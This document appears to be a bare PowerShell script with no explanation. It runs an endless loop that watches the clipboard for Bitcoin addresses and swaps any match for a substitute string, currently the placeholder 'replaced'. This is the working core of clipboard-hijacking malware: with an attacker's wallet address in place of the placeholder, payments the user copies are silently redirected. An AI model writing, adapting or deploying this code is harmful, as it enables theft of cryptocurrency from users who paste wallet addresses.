
$regex = "^(bc1|[13])[a-zA-HJ-NP-Z0-9]{25,39}$"  # Bitcoin address
$replace_to = "replaced"

while ($true)
    {
    sleep 0.5
    $clipboard = Get-Clipboard
    if ($clipboard -match $regex)
        {
        Set-Clipboard $replace_to
        }
    }

    